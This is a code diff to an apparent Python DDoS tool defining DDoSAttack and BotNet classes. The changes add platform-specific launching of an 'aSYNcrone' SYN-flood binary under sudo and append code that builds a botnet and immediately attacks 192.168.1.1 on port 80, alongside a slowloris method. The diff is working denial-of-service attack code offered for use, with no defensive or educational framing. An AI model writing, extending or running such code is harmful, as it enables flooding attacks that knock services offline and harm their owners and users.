@@ -1,7 +1,7 @@
 import torch
 import torch.nn as nn
 import threading
-from .random_string_generator import RandomStringGenerator
+from random_string_generator import RandomStringGenerator
 import logging
 import os
 import subprocess
@@ -22,7 +22,7 @@ class DDoSAttack:
         self.num_connections = num_connections
         self.attack_type = attack_type
         self.threads = []
-        self.model = RandomStringGenerator()
+        self.model = RandomStringGenerator(100)
 
     def create_connection(self):
         for _ in range(self.num_connections):
@@ -40,8 +40,29 @@ class DDoSAttack:
 
     def aSYNcrone_attack(self):
         if sys.platform == "darwin" and platform.machine() == "arm64":
-            path_to_executable = os.path.join(os.path.dirname(__file__), 'src/aSYNcrone/aSYNcrone-mac')
-        command = ['sudo', path_to_executable, str(self.target_ip), str(self.target_port), str(self.num_connections)]
+            path_to_executable = os.path.join(
+                os.path.dirname(__file__), "aSYNcrone/aSYNcronemacARM"
+            )
+        elif sys.platform == "darwin":
+            path_to_executable = os.path.join(
+                os.path.dirname(__file__), "aSYNcrone/aSYNcronemac"
+            )
+        elif sys.platform == "linux":
+            path_to_executable = os.path.join(
+                os.path.dirname(__file__), "aSYNcrone/aSYNcrone"
+            )
+        else:
+            logging.error(f"Unknown platform: {sys.platform}")
+            return
+        # aSYNcronemacARM <source port> <target IP> <target port> <threads number>
+        command = [
+            "sudo",
+            path_to_executable,
+            "80",
+            self.target_ip,
+            str(self.target_port),
+            str(self.num_connections),
+        ]
         subprocess.run(command, check=True)
 
     def slowloris_attack(self):
@@ -76,3 +97,10 @@ class BotNet:
             bot.create_connection()
         for bot in self.bots:
             bot.wait_for_threads()
+
+
+botnet = BotNet(
+    1, "192.168.1.1", 80, 1, "aSYNcrone"
+)  # num of bots, target IP, target port, connections per bot
+botnet.create_bots()
+botnet.launch_attack()
